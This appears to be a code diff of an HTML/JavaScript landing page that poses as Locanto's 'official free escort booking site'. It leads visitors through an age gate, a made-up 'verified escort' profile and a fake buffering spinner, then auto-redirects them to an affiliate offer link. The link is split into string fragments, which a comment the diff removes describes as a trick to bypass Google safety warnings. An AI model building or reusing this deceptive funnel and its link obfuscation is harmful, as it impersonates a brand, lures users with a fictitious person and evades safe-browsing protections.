@@ -38,13 +38,11 @@
             transition: background 0.3s ease;
         }
 
-        /* হোয়াইট পেজ মোড (ধাপ ৩ ও ৪ এর জন্য) */
         .container.white-mode {
             background-color: #f4f6f9 !important;
             color: #222 !important;
         }
 
-        /* ব্যাকগ্রাউন্ড ইমেজ স্লাইডার */
         .slider-bg {
             position: absolute;
             top: 0;
@@ -69,7 +67,6 @@
             opacity: 0.4;
         }
 
-        /* লোগো স্টাইল */
         .logo-area {
             position: relative;
             z-index: 2;
@@ -86,7 +83,6 @@
             object-fit: contain;
         }
 
-        /* কন্টেন্ট বক্স */
         .content-box {
             position: relative;
             z-index: 2;
@@ -99,7 +95,6 @@
             backdrop-filter: blur(10px);
         }
 
-        /* হোয়াইট মোডে কন্টেন্ট বক্সের স্টাইল */
         .white-mode .content-box {
             background: #ffffff;
             border: 1px solid #e0e0e0;
@@ -115,7 +110,6 @@
             display: block;
         }
 
-        /* টেক্সট স্টাইল */
         .warning-title {
             color: #ff3366;
             font-size: 14px;
@@ -135,14 +129,12 @@
             color: #444;
         }
 
-        /* নাম হাইলাইট */
         .highlight-name {
             color: #ff3366;
             font-weight: bold;
             text-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
         }
 
-        /* বোতাম বা বাটন সমূহ */
         .btn {
             display: block;
             width: 100%;
@@ -173,7 +165,6 @@
             transform: scale(0.98);
         }
 
-        /* প্রোফাইল পার্ট (ধাপ ৩) */
         .profile-card {
             display: flex;
             flex-direction: column;
@@ -196,7 +187,6 @@
             border: 3px solid #0072ff;
         }
 
-        /* একটিভ সবুজ সিম্বল */
         .active-dot {
             position: absolute;
             bottom: 5px;
@@ -219,7 +209,6 @@
             margin-bottom: 8px;
         }
 
-        /* ভেরিফাইড ব্যাজ */
         .verified-badge {
             width: 20px;
             height: 20px;
@@ -240,7 +229,6 @@
             font-weight: 500;
         }
 
-        /* ফেক বাফরিং এবং শেষ ধাপ (ধাপ ৪) */
         .buffering-container {
             display: flex;
             flex-direction: column;
@@ -281,8 +269,6 @@
 <body>
 
     <div class="container" id="mainContainer">
-        
-        <!-- ব্যাকগ্রাউন্ড স্লাইডার (১ সেকেন্ড পর পর পরিবর্তন হবে) -->
         <div class="slider-bg" id="sliderBg">
             <img src="jk1.webp" class="active" alt="Pic 1">
             <img src="jk2.webp" alt="Pic 2">
@@ -290,28 +276,22 @@
             <img src="jk4.webp" alt="Pic 4">
         </div>
 
-        <!-- লোগো এরিয়া (জাভাস্ক্রিপ্ট দিয়ে ডাইনামিকালি চেঞ্জ হবে) -->
         <div class="logo-area">
             <img src="jkz.png" id="topLogo" alt="Logo">
         </div>
 
-        <!-- কন্টেন্ট এরিয়া -->
         <div class="content-box">
-            
-            <!-- ধাপ ১: ১৮+ ওয়ার্নিং ভেরিফিকেশন -->
             <div class="step active" id="step1">
                 <div class="warning-title">⚠️ WARNING</div>
-                <p class="step-text">This is not a social media birthday king site. This is the official free escort booking site of Lokanto. If you are over 18 years old, please enter the free booking site.</p>
+                <p class="step-text">This is not a social media birthday king site. This is the official free escort booking site of Locanto. If you are over 18 years old, please enter the free booking site.</p>
                 <button class="btn btn-main" onclick="goToStep2()">YES, I AM 18+</button>
             </div>
 
-            <!-- ধাপ ২: ভেরিফাইড স্কট নোটিশ -->
             <div class="step" id="step2">
                 <p class="step-text"><span class="highlight-name">Jacklyn</span> is one of our verified escorts. Ask <span class="highlight-name">Jacklyn</span> via private messaging if she is available. Please refrain from making advance payments.</p>
                 <button class="btn btn-blue" onclick="goToStep3()">Jacklyn's Profile</button>
             </div>
 
-            <!-- ধাপ ৩: সাদা পেজ এবং জ্যাকলিনের প্রোফাইল -->
             <div class="step" id="step3">
                 <div class="profile-card">
                     <div class="avatar-container">
@@ -329,20 +309,16 @@
                 <button class="btn btn-main" onclick="startBuffering()">SEND MESSAGE</button>
             </div>
 
-            <!-- ধাপ ৪: ফেক বাফরিং এবং রেজিস্ট্রেশন এলার্ট -->
             <div class="step" id="step4">
                 <div class="buffering-container">
                     <div class="spinner" id="loadingSpinner"></div>
                     <div class="alert-text">FREE REGISTRATION REQUIRED</div>
                 </div>
             </div>
-
         </div>
     </div>
 
-    <!-- রিডাইরেক্ট অফার লিংকটি ব্যাকগ্রাউন্ডে প্রি-লোড রাখার জন্য এন্টি-বট মেথড -->
     <script>
-        // স্লাইডার স্ক্রিপ্ট
         const images = document.querySelectorAll('.slider-bg img');
         let currentImgIndex = 0;
         const sliderInterval = setInterval(() => {
@@ -353,7 +329,6 @@
             }
         }, 1000);
 
-        // লিংক সিকিউরিটি পার্ট (গুগল সেফটি ওয়ার্নিং বাইপাস করার ট্রিক)
         const block1 = "https://paysale.";
         const block2 = "g2afse.com/click?";
         const block3 = "pid=125904&offer_id=10417&sub1=tgrm";
@@ -366,30 +341,23 @@
             document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
         }
 
-        // ধাপ ২ এ যাওয়ার ফাংশন
         function goToStep2() {
             hideAllSteps();
             document.getElementById('step2').classList.add('active');
         }
 
-        // ধাপ ৩ এ যাওয়ার ফাংশন (সাদা পেজ এবং নতুন লোগো)
         function goToStep3() {
             hideAllSteps();
-            clearInterval(sliderInterval); // স্লাইডার বন্ধ করা হলো
-            document.getElementById('sliderBg').style.display = 'none'; // ছবি রিমুভ
-            
-            container.classList.add('white-mode'); // ব্যাকগ্রাউন্ড সাদা করা হলো
-            topLogo.src = 'vc1.png'; // লোগো পরিবর্তন করে vc1.png করা হলো
-            
+            clearInterval(sliderInterval);
+            document.getElementById('sliderBg').style.display = 'none';
+            container.classList.add('white-mode');
+            topLogo.src = 'vc1.png';
             document.getElementById('step3').classList.add('active');
         }
 
-        // ধাপ ৪: বাফরিং এবং ফাইনাল অটো-রিডাইরেক্ট (২ সেকেন্ড)
         function startBuffering() {
             hideAllSteps();
             document.getElementById('step4').classList.add('active');
-
-            // ঠিক ২ সেকেন্ড (২০০০ মিলিসেকেন্ড) ফেক বাফরিং হবে, তারপর অফার লিংক ওপেন হবে
             setTimeout(() => {
                 window.location.replace(targetUrl);
             }, 2000);
